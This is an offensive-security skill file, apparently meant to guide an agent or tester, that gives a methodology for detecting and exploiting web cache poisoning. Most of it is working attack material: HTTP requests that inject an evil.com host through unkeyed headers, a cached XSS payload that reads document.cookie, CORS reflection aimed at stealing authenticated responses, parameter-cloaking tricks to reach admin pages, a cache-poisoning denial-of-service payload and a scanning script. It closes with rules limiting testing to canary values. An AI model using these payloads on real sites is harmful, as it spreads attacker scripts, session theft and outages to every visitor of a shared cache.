---
name: cache-poisoning
description: >
  Web Cache Poisoning detection and exploitation. Covers unkeyed headers,
  parameter cloaking, cache key normalization, XSS via cache, and DoS via
  cache. Targets: CDN (Cloudflare/Akamai/Fastly), reverse proxy (Varnish/Nginx),
  application-level caching (Redis/Memcached).
metadata:
  tags: "cache-poisoning,web-cache,cdn,unkeyed-headers,cache-key,cp-dos,x-cache"
  category: "offensive-security"
---

# Web Cache Poisoning — Detection & Exploitation

> Cache Poisoning turns a single crafted request into a persistent attack
> that affects every subsequent user requesting the same resource.

## 1. Cache Identification

### Response Headers

```
Cache Hit Indicators:
  X-Cache: HIT / hit / Hit from cloudfront
  X-Cache-Status: HIT
  CF-Cache-Status: HIT
  Age: > 0
  X-Served-By: cache-*
  X-Cache-Hits: 1+

Cache Providers:
  Cloudflare:     CF-Cache-Status, CF-RAY
  AWS CloudFront: X-Cache, Via: ...cloudfront...
  Akamai:         X-Cache, X-Cache-Key
  Fastly:         X-Served-By, X-Cache-Hits
  Varnish:        X-Varnish, Via: varnish
  Nginx:          X-Proxy-Cache
```

### Cache Key Detection

The cache key is what the cache uses to identify "same resource". Only
unkeyed components can be poisoned.

```
Step 1: Baseline request
  GET /?cb=1234 HTTP/1.1
  Host: target.com

Step 2: Add suspect header
  GET /?cb=1235 HTTP/1.1
  Host: target.com
  X-Forwarded-Host: evil.com

Step 3: Remove header, request again
  GET /?cb=1234 HTTP/1.1
  Host: target.com

If response still contains "evil.com" → X-Forwarded-Host is UNKEYED → can be poisoned!
```

## 2. Attack Vectors (by unkeyed component)

### X-Forwarded-Host (Highest Impact)

```
GET / HTTP/1.1
Host: target.com
X-Forwarded-Host: evil.com

Response (cached!):
  <script src="https://evil.com/static/app.js"></script>
  <a href="https://evil.com/login">Login</a>
```

Next user requesting GET / gets scripts and links pointing to evil.com.

### X-Forwarded-Scheme

```
GET / HTTP/1.1
Host: target.com
X-Forwarded-Scheme: http

Response (cached!):
  <script src="http://target.com/static/app.js"></script>
  → Browser blocks mixed content → breaks the site
```

### X-Forwarded-For / X-Real-IP (Reflected IP)

```
GET /?cb={rand} HTTP/1.1
Host: target.com
X-Forwarded-For: <img src=x onerror=alert(1)>

Response (cached!):
  Your IP: <img src=x onerror=alert(1)>
```

### Origin / Referer Reflection

```
GET /api/jsonp?callback=steal HTTP/1.1
Host: target.com
Origin: https://evil.com

Response:
  Access-Control-Allow-Origin: https://evil.com
  Access-Control-Allow-Credentials: true
```

Cached CORS headers allow evil.com to steal authenticated responses.

### User-Agent (Mobile/Desktop Switching)

```
GET / HTTP/1.1
Host: target.com
User-Agent: Mozilla/5.0 (Mobile)

Response (cached!): Mobile version
→ Desktop users get served mobile version (or vice versa)
```

### Fat GET (Parameter in Body)

```
GET /?cb=1234 HTTP/1.1
Host: target.com
Content-Length: 20

ignore=parameter
```

Some caches include the body in cache key. Some don't. Test both.

## 3. Parameter Cloaking (Cache Key Confusion)

### ; Parameter Separator (Rails/Spring)

```
GET /home;admin=true?cb={rand} HTTP/1.1
Host: target.com
```

Cache sees: `/home` → serves cached version
App sees: `/home;admin=true` → returns admin page

### URL Encoding Confusion

```
GET /home%3Fadmin=true?cb={rand} HTTP/1.1
Host: target.com
```

Cache sees: `/home?admin=true` (decoded)
App sees: `/home%3Fadmin=true` (raw → different route)

## 4. XSS via Cache Poisoning

```
GET /static/js/i18n/en.js HTTP/1.1
Host: target.com
X-Forwarded-Host: evil.com"></script><script>alert(document.cookie)</script><!--

Response (cached!):
  var config = {"host": "evil.com"></script><script>alert(document.cookie)</script><!--"};
```

Now EVERY user loading /static/js/i18n/en.js executes the XSS.

## 5. CP-DoS (Cache Poisoning Denial of Service)

```
GET /static/style.css HTTP/1.1
Host: target.com
X-Forwarded-Host: aaaaaaaaa...(10KB of 'a' repeated)

Response (cached!): 10KB garbage
→ Every user requesting style.css gets 10KB garbage
→ Site broken for all users
```

## 6. Automated Test Sequence

### Step 1: Cache Behavior Baseline

```python
# Fetch same URL 3 times, check for cache headers
for i in range(3):
    resp = fetch("{target}/?cb=" + str(i))
    check: X-Cache, Age, CF-Cache-Status
```

### Step 2: Unkeyed Header Discovery

```python
# Param Miner approach: inject canary → flush → check
headers_to_test = [
    "X-Forwarded-Host", "X-Forwarded-Scheme", "X-Forwarded-For",
    "X-Real-IP", "X-Original-URL", "X-Rewrite-URL",
    "Origin", "Referer", "User-Agent", "Accept-Encoding",
    "X-HTTP-Method-Override", "X-Custom-IP-Authorization",
]

for header in headers_to_test:
    canary = "canary-" + str(random.randint(10000, 99999))
    resp = fetch("{target}/?cb=" + canary,
                 headers={header: "evil.com"})
    # Flush cache key
    resp2 = fetch("{target}/?cb=" + canary)
    # Check if "evil.com" appears in response
    if "evil.com" in resp2.text:
        log(f"[VULNERABLE] {header} is unkeyed and reflected")
```

### Step 3: Impact Verification

```
Testing: X-Forwarded-Host
  Cache Key: GET /static/js/main.js?cb={rand}
  Poison Payload: X-Forwarded-Host: attacker-server.com
  Verify: Request WITHOUT malicious header → still returns poisoned response
```

## 7. Output

```
findings/
└── cache_poisoning/
    ├── _cache_fingerprint.json    # Cache provider + key detection
    ├── _unkeyed_headers.json      # Headers not in cache key
    ├── _confirmed_poisons.json    # Verified cache poisoning findings
    └── _poc/
        ├── poison_screenshot.png  # Before/after cache poisoning
        └── cleanup_request.txt    # Request to flush poisoned cache
```

## 8. Rules

```
⛔ Only poison caches with your OWN canary values
⛔ Clean up immediately after PoC (send uncached request to flush)
⛔ NEVER target production with XSS/cookie-stealing payloads
⛔ Test during off-peak hours
```
